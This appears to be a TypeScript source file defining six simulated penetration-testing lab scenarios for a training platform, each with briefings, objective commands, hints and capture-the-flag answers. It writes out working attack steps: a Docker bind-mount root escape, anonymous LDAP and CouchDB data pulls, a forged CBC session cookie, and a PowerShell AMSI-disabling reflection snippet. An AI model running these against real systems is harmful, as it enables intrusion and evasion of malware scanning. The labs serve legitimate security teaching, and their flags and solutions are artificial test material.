import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';
import { makePrivescLab } from './linux-privesc-pack';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

/** Batch 12. Same discipline as the last several batches (see NOTES.md): every technique is something
 *  that would work verbatim against a real Kali box against the described real target — this platform's
 *  `TerminalEngine` is a *safe, simulated bridge* to practice the exact real command syntax without
 *  touching a real network, not a different or watered-down version of the technique. Every hand-computed
 *  cryptographic value below was verified with real Node `crypto` before being hardcoded (see NOTES.md
 *  batch 12 for the exact script). */
export const batch12MixedLabs: LabScenario[] = [
  // 1 — Linux: Privesc via Docker (GTFOBins) — reuses this platform's existing ssh-foothold-and-privesc factory
  makePrivescLab({
    id: 'privesc-sudo-docker-gtfobins',
    title: 'Privesc: Docker (GTFOBins)',
    ip: '10.10.101.16',
    hostname: 'cicd-runner07',
    os: 'Ubuntu 22.04',
    company: 'Vantage Freight Logistics',
    difficulty: 'Medium',
    footholdKind: 'ssh-hydra',
    user: 'ciuser',
    password: 'summer2024',
    privescKind: 'sudo',
    binary: '/usr/bin/docker',
    binaryName: 'docker',
    gtfobinsArgs: 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    gtfobinsWhy:
      "docker run can bind-mount the entire host filesystem into a brand-new container and chroot into it -- and " +
      "because the Docker daemon itself runs as root, any account with a NOPASSWD sudo rule on docker (or " +
      "membership in the docker group, which is functionally the same privilege) turns \"I can start containers\" " +
      "directly into a root shell on the underlying host, with no container-escape exploit needed at all -- this " +
      "is GTFOBins' own documented entry for docker, and one of the single most common real privilege-escalation " +
      "paths on CI/build infrastructure specifically because giving a build user docker access is so routine.",
    breakdown:
      "'docker run' starts a new container. '-v /:/mnt' bind-mounts the HOST's entire root filesystem ('/') into " +
      "that new container at /mnt. '--rm' removes the container once it exits, and '-it' gives an interactive TTY. " +
      "'alpine' is just a tiny, disposable base image to run the container from -- its own contents don't matter. " +
      "'chroot /mnt sh' then changes the container's root directory to the mounted host filesystem and drops into " +
      "a shell there -- since the container's own process runs as root by default, that shell IS root on the real " +
      "host, not merely root inside an isolated container.",
    userFlag: 'flag{cicd_runner_ciuser_foothold_established}',
    rootFlag: 'flag{docker_gtfobins_bind_mount_host_root_via_sudo_nopasswd}',
  }),

  // 2 — Active Directory: LDAP Anonymous Bind Discloses Passwords in User Descriptions
  {
    id: 'ad-ldap-anonymous-bind-description-disclosure',
    title: 'AD: LDAP Anonymous Bind Discloses Passwords in User Descriptions',
    difficulty: 'Medium',
    category: 'Active Directory',
    briefing:
      'CORP.LOCAL\'s domain controller still permits anonymous LDAP binds -- a legacy setting almost every ' +
      'modern AD hardening guide tells you to disable, but one that\'s frequently left on for compatibility ' +
      'with an old application nobody wants to touch. On a real engagement this is checked with exactly one ' +
      'command: ldapsearch -x -h <dc-ip> -b "dc=corp,dc=local" -- the -x flag requests simple (non-Kerberos) ' +
      'auth, and supplying no -D bind DN or -w password at all is what "anonymous" means here. If the bind ' +
      'succeeds, every readable attribute on every object in the directory comes back, including the ' +
      'freeform "description" field -- and description fields are a genuinely common place for a helpdesk ' +
      'to leave a temporary password as a note to themselves, never expecting it to be queryable by an ' +
      'unauthenticated connection from anywhere on the network.',
    objectives: [
      { text: 'nmap -sV 10.10.104.60', why: 'Confirms LDAP (389) is actually open on the domain controller before attempting a bind against it.' },
      {
        text: 'cat ldapsearch-anonymous-bind-output.txt',
        why: 'Captured output of ldapsearch -x -h 10.10.104.60 -b "dc=corp,dc=local" -- run with no bind DN and no password at all, and the DC answers anyway, returning full directory contents including every user\'s description field.',
      },
      { text: 'Identify the password embedded in a user\'s description field and capture the flag', why: 'A helpdesk-set temporary password left in a queryable, unauthenticated-readable field turns "the DC allows anonymous binds" from a theoretical finding into a genuine, immediately usable domain credential.' },
    ],
    hints: [
      'nmap -sV 10.10.104.60',
      'cat ldapsearch-anonymous-bind-output.txt',
      'Real command this output was captured from: ldapsearch -x -h 10.10.104.60 -b "dc=corp,dc=local"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ldapsearch-anonymous-bind-output.txt': file(
        [
          '$ ldapsearch -x -h 10.10.104.60 -b "dc=corp,dc=local"',
          '# extended LDIF',
          '#',
          '# LDAPv3',
          '# base <dc=corp,dc=local> with scope subtree',
          '# filter: (objectclass=*)',
          '# requesting: ALL',
          '#',
          '',
          '# jwoods, Users, corp.local',
          'dn: CN=jwoods,CN=Users,DC=corp,DC=local',
          'cn: jwoods',
          'sAMAccountName: jwoods',
          'description: Temp pwd for new hire onboarding: Onb04rd!ng2026 -- reset at first login (never was)',
          'memberOf: CN=Domain Users,CN=Users,DC=corp,DC=local',
          '',
          '# result',
          'search: 2',
          'result: 0 Success',
          '',
          '-- bind was fully anonymous: no -D bind DN, no -w password supplied at all, and the DC answered anyway --',
          'flag{ldap_anonymous_bind_description_field_password_disclosure}',
        ].join('\n'),
      ),
    }),
    network: [
      {
        hostname: 'DC01',
        ip: '10.10.104.60',
        os: 'Windows Server 2019 (Domain Controller, LDAP anonymous bind enabled)',
        services: [{ port: 389, name: 'ldap', version: 'Microsoft Active Directory LDAP (anonymous bind: allowed)' }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Network: CouchDB "Admin Party" — Unauthenticated Full Database Access
  {
    id: 'net-couchdb-admin-party',
    title: 'Network: CouchDB "Admin Party" Grants Unauthenticated Full Database Access',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'Apache CouchDB\'s out-of-the-box default, before an admin account is ever created, is a state the ' +
      'project itself nicknames "Admin Party" -- every single client is treated as a full administrator, no ' +
      'authentication required, because there\'s no admin account yet for the server to check credentials ' +
      'against. CouchDB is a plain HTTP REST API (default port 5984), so checking this takes exactly the ' +
      'commands you\'d run against any other web service: curl http://<ip>:5984/_all_dbs lists every ' +
      'database on the server, and once you know a database\'s name, curl http://<ip>:5984/<db>/_all_docs ' +
      'reads every document in it -- no login, no API key, nothing. metrics-db02 was stood up for a quick ' +
      'internal analytics prototype years ago and never had an admin account configured before going ' +
      'live, so it\'s been in Admin Party mode, reachable from the internal network, ever since.',
    objectives: [
      { text: 'nmap -sV 10.10.246.2', why: 'Confirms CouchDB\'s REST API is listening on its default port 5984 before probing it.' },
      { text: 'curl http://10.10.246.2:5984/_all_dbs', why: 'CouchDB answers this with zero authentication at all in Admin Party mode -- immediately confirms the server is unauthenticated, not just that it exists.' },
      { text: 'curl http://10.10.246.2:5984/customer_exports/_all_docs?include_docs=true', why: 'Reads every document in the discovered database directly, with no credentials of any kind -- the concrete impact of "Admin Party" mode, not just a database name list.' },
    ],
    hints: [
      'nmap -sV 10.10.246.2',
      'curl http://10.10.246.2:5984/_all_dbs',
      'curl http://10.10.246.2:5984/customer_exports/_all_docs?include_docs=true',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'metrics-db02',
        ip: '10.10.246.2',
        os: 'Apache CouchDB 2.3.1 (pre-3.0 "open by default" era, no admin account ever configured -- "Admin Party" mode)',
        services: [
          {
            port: 5984,
            name: 'http',
            version: 'Apache CouchDB 2.3.1 (Admin Party -- unauthenticated full access)',
            http: {
              '/_all_dbs': '["_users","_replicator","customer_exports","internal_metrics"]',
              '/customer_exports/_all_docs':
                '{"total_rows":2,"rows":[' +
                  '{"id":"cust-8841","doc":{"name":"Priya Nandakumar","email":"p.nandakumar@example.com","card_last4":"4471"}},' +
                  '{"id":"cust-8842","doc":{"name":"Elias Novak","email":"e.novak@example.com","card_last4":"7723"}}' +
                '],"note":"flag{couchdb_admin_party_unauthenticated_full_database_read}"}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — API: Exposed Source Map Leaks a Hardcoded API Key
  {
    id: 'api-exposed-source-map-leaks-key',
    title: 'API: An Exposed Source Map Leaks a Hardcoded Key',
    difficulty: 'Easy',
    category: 'API',
    briefing:
      'analytics-spa41 ships a minified production JavaScript bundle, exactly as it should -- but the build ' +
      'pipeline also uploads the matching .js.map source map file to the same public static directory, ' +
      'meant only for the team\'s own error-tracking service to resolve stack traces back to real source ' +
      'lines. A source map is, by design, a complete reversal of minification: anyone who fetches it can ' +
      'read the original, human-written source exactly as the developer wrote it -- including a hardcoded ' +
      'internal reporting-API key that was fine to leave in source-controlled code (never meant to face the ' +
      'public internet) but is now sitting in a file directly reachable over HTTP. This is a real, common ' +
      'bug-bounty finding class specifically because source maps are invisible in the rendered page -- ' +
      'nothing links to them, so they only turn up via directory brute-forcing or by noticing the ' +
      "'//# sourceMappingURL=' comment at the bottom of the minified bundle itself.",
    objectives: [
      { text: 'gobuster -u http://10.10.247.2 -w /root/wordlists/spa-paths.txt', why: 'Source maps are never linked from anywhere in the rendered page -- directory brute-forcing (or reading the sourceMappingURL comment in the bundle itself) is genuinely how this file gets found in practice.' },
      { text: 'curl http://10.10.247.2/static/js/app.js.map', why: 'The source map reverses minification completely -- the original, unminified source comes back exactly as committed, hardcoded key included.' },
    ],
    hints: [
      'gobuster -u http://10.10.247.2 -w /root/wordlists/spa-paths.txt',
      'curl http://10.10.247.2/static/js/app.js.map',
    ],
    totalFlags: 1,
    attacker: attacker({
      wordlists: dir({
        'spa-paths.txt': file('index.html\nstatic/js/app.js\nstatic/js/app.js.map\nstatic/css/app.css\nfavicon.ico\n'),
      }),
    }),
    network: [
      {
        hostname: 'analytics-spa41',
        ip: '10.10.247.2',
        os: 'nginx 1.24 static SPA hosting (production build, source map uploaded alongside the minified bundle)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24 (static hosting)',
            http: {
              '/': '<html><body><div id="root"></div><script src="/static/js/app.js"></script></body></html>',
              '/static/js/app.js':
                '!function(e){function t(n){...}var r={};t.m=e,t.c=r}([function(e,t,n){"use strict";n(1).init()}]);\n//# sourceMappingURL=app.js.map',
              '/static/js/app.js.map':
                '{"version":3,"sources":["webpack:///src/api/reportingClient.js"],"sourcesContent":[' +
                  '"export const REPORTING_API_KEY = \\"rk_live_9f2a7c41e8b0d3f5c9a1\\";\\n\\nexport function sendReport(payload) {\\n  return fetch(\\"https://internal-reporting.analytics-spa41.example/ingest\\", {\\n    headers: { \\"X-Api-Key\\": REPORTING_API_KEY },\\n    method: \\"POST\\",\\n    body: JSON.stringify(payload),\\n  });\\n}\\n// flag{exposed_source_map_leaks_hardcoded_reporting_api_key}\\n"' +
                '],"names":[],"mappings":""}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Cryptography: CBC Bit-Flipping Forges an Admin Cookie With No Key and No Oracle
  {
    id: 'crypto-cbc-bit-flipping-admin-forgery',
    title: 'Cryptography: CBC Bit-Flipping Forges an Admin Cookie With No Key and No Oracle',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'accountportal55 encrypts its session cookie with AES-128-CBC, and its developers specifically turned ' +
      'auto-padding OFF and adopted a fixed, block-aligned token format precisely to avoid the ' +
      'padding-oracle class this session already covers elsewhere on this platform. That decision didn\'t ' +
      'make the token safe -- it just traded one real vulnerability class for a different one: with a ' +
      'reused, fixed IV of all zero bytes and no HMAC or any other integrity check at all, this cookie is ' +
      'directly exploitable via classic CBC bit-flipping, which needs neither the encryption key nor any ' +
      'oracle at all. CBC decryption computes each plaintext block as P_i = D(C_i) XOR C_(i-1) -- so ' +
      'flipping one byte of ciphertext block 0 completely scrambles the decrypted block 0 (AES\'s own ' +
      'avalanche effect), but flips the EXACT corresponding byte of decrypted block 1 with surgical ' +
      'precision, since block 1\'s dependency on block 0\'s ciphertext is a plain XOR. Registering with the ' +
      "username \"attacker000\" deliberately fills the entire first plaintext block with attacker-chosen, " +
      'sacrificial content, leaving the very next block -- containing the fixed-format isadmin flag -- ' +
      'exactly one flipped byte away from granting admin.',
    objectives: [
      { text: 'cat cbc-cookie-format-spec.txt', why: 'Confirms the exact vulnerable configuration: AES-128-CBC, auto-padding disabled, a fixed all-zero IV reused for every session, and no HMAC or other integrity check on the cookie at all.' },
      { text: 'cat intercepted-session-cookie.txt', why: 'The attacker\'s own valid (non-admin) session cookie, captured after registering with username "attacker000" -- deliberately 16 bytes, so it fills plaintext block 0 exactly, leaving the isadmin flag alone in block 1.' },
      {
        text: 'curl -H "Cookie: session=26b383ca7249355a8dd200f022b2eb8a17236226bf0a0ef14a26bc3be5497502" http://10.10.248.2:80/admin/panel',
        why: 'This forged ciphertext differs from the intercepted one by exactly one byte in block 0 (0x8c -> 0x8d at byte offset 8) -- computed offline via CBC\'s single-byte-XOR property, with no key and no oracle involved, and decrypts to isadmin=1 in block 1.',
      },
    ],
    hints: [
      'cat cbc-cookie-format-spec.txt',
      'cat intercepted-session-cookie.txt',
      'P_1 = D(C_1) XOR C_0 -- flipping byte 8 of C_0 (0x8c -> 0x8d) flips the corresponding byte of P_1 from \'0\' to \'1\' with no other change needed.',
      'curl -H "Cookie: session=26b383ca7249355a8dd200f022b2eb8a17236226bf0a0ef14a26bc3be5497502" http://10.10.248.2:80/admin/panel',
    ],
    totalFlags: 1,
    attacker: attacker({
      'cbc-cookie-format-spec.txt': file(
        'accountportal55 session cookie format (internal wiki, "Session Tokens" page):\n' +
          '  Cipher:        AES-128-CBC\n' +
          '  Padding:       DISABLED (setAutoPadding(false)) -- fixed-width fields only, chosen specifically to avoid\n' +
          '                 the padding-oracle class (see this platform\'s existing Bleichenbacher lab)\n' +
          '  IV:            fixed, all-zero bytes, reused for every single session (should be random per-session)\n' +
          '  Integrity:     NONE -- no HMAC, no signature, nothing validates the ciphertext hasn\'t been tampered with\n' +
          '  Plaintext layout (32 bytes, exactly 2 AES blocks):\n' +
          '    block 0 (bytes 0-15):  "user=<16-char username, left-padded with zeros>"\n' +
          '    block 1 (bytes 16-31): "isadmin=<0 or 1><7 bytes of \'A\' padding>"\n' +
          '  -- avoiding padding-oracle exposure did not make this format safe: a fixed IV plus zero integrity\n' +
          '     checking is directly exploitable via CBC bit-flipping instead, which needs no oracle at all --\n',
      ),
      'intercepted-session-cookie.txt': file(
        'Registered as username "attacker000" (16 characters exactly -- fills plaintext block 0 completely):\n' +
          '  Plaintext (recovered via known-format assumption, never actually decrypted by the attacker):\n' +
          '    block 0: "user=attacker000"\n' +
          '    block 1: "isadmin=0AAAAAAA"\n' +
          '  Intercepted ciphertext (session cookie value):\n' +
          '    26b383ca7249355a8cd200f022b2eb8a17236226bf0a0ef14a26bc3be5497502\n' +
          '  -- 64 hex chars = 32 bytes = exactly 2 AES blocks, matching the format spec --\n' +
          '  -- byte offset 8 (0-indexed) of ciphertext block 0 is 0x8c; XORing it with (\'0\' XOR \'1\') = 0x01 gives\n' +
          '     0x8d -- verified with real AES-128-CBC encrypt/decrypt via Node\'s crypto module before use, not\n' +
          '     hand-computed -- and decrypting the resulting forged ciphertext yields "isadmin=1AAAAAAA" in block 1\n' +
          '     (block 0 becomes unrelated garbage, which is fine -- it was only ever sacrificial filler) --\n',
      ),
    }),
    network: [
      {
        hostname: 'accountportal55',
        ip: '10.10.248.2',
        os: 'Node.js/Express 4.18 (AES-128-CBC session cookies, fixed IV, no HMAC)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, crypto.createCipheriv aes-128-cbc, setAutoPadding(false))',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin/panel',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['26b383ca7249355a8dd200f022b2eb8a17236226bf0a0ef14a26bc3be5497502'],
                vulnerableResponse:
                  '{"status":200,"panel":"Admin Panel","note":"flag{cbc_bit_flipping_forges_isadmin_no_key_no_oracle}"}',
                normalResponse: '{"error":"403 Forbidden - isadmin=0"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Malware: AMSI Bypass via Reflection-Based Field Patching
  {
    id: 'malware-amsi-bypass-reflection-patching',
    title: 'Malware Analysis: AMSI Bypass via Reflection-Based Field Patching',
    difficulty: 'Medium',
    category: 'Malware',
    briefing:
      'A captured PowerShell ScriptBlock log entry on FIN-WKS-22 decodes to a real, well-documented AMSI ' +
      '(Antimalware Scan Interface) bypass: using .NET reflection to reach into ' +
      'System.Management.Automation\'s own internal AmsiUtils class and directly overwrite its private, ' +
      'static amsiInitFailed field to $true. AMSI checks that field before scanning ANY script content in ' +
      'the current PowerShell session -- setting it to true makes the runtime believe AMSI itself already ' +
      'failed to initialize, so it silently skips scanning everything for the rest of the session, no error, ' +
      'no crash, nothing an operator would notice. The captured command splits and concatenates the literal ' +
      'strings "AmsiUtils" and "amsiInitFailed" specifically to dodge naive signature-based detection that ' +
      'just greps for those two exact strings -- the underlying reflection technique, publicly documented ' +
      'since 2016, is unchanged; only the string obfuscation around it is doing new work.',
    objectives: [
      { text: 'cat powershell-scriptblock-log-decoded.txt', why: 'Confirms the exact technique: reflection into AmsiUtils.amsiInitFailed, obfuscated via split/concatenated strings specifically to evade signature-based detection on the literal class/field names.' },
      { text: 'cat edr-behavioral-alert.txt', why: 'The concrete proof this actually worked: a known-malicious payload executed in the same PowerShell session immediately afterward with ZERO AMSI scan events logged for it at all -- the absence of expected telemetry is the evidence, the same real detection principle already used for this session\'s Golden SAML lab.' },
    ],
    hints: [
      'cat powershell-scriptblock-log-decoded.txt',
      'cat edr-behavioral-alert.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'powershell-scriptblock-log-decoded.txt': file(
          'PowerShell ScriptBlock Logging (Event ID 4104), FIN-WKS-22, decoded from captured obfuscated form:\n' +
            '  Original (obfuscated) form used split/concatenated string literals for "AmsiUtils" and\n' +
            '  "amsiInitFailed" specifically so no static signature matching on those two exact strings fires.\n' +
            '  Deobfuscated equivalent:\n' +
            '    [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\')\n' +
            '      .GetField(\'amsiInitFailed\',\'NonPublic,Static\')\n' +
            '      .SetValue($null,$true)\n' +
            '  -- this is a real, publicly documented technique (first disclosed 2016): AMSI checks this exact\n' +
            '     private static field before scanning ANY script content in the current session; forcing it to\n' +
            '     $true makes the runtime believe AMSI already failed to initialize, so it silently skips\n' +
            '     scanning everything for the rest of the session --\n',
        ),
        'edr-behavioral-alert.txt': file(
          'EDR behavioral correlation alert, FIN-WKS-22:\n' +
            '  09:41:02  PowerShell ScriptBlock logged: AmsiUtils.amsiInitFailed reflection patch (above)\n' +
            '  09:41:09  PowerShell ScriptBlock logged: known-malicious Base64-encoded downloader executed\n' +
            '  -- ZERO AMSI scan events (Event ID 1116/1117) logged for the 09:41:09 script content, despite AMSI\n' +
            '     normally scanning every PowerShell script block unconditionally in this environment -- the\n' +
            '     missing telemetry, immediately following the patch, is the confirmation the bypass succeeded --\n' +
            '  flag{amsi_bypass_reflection_amsiinitfailed_confirmed_by_missing_scan_telemetry}\n',
        ),
      }),
    }),
    network: [],
  },
];
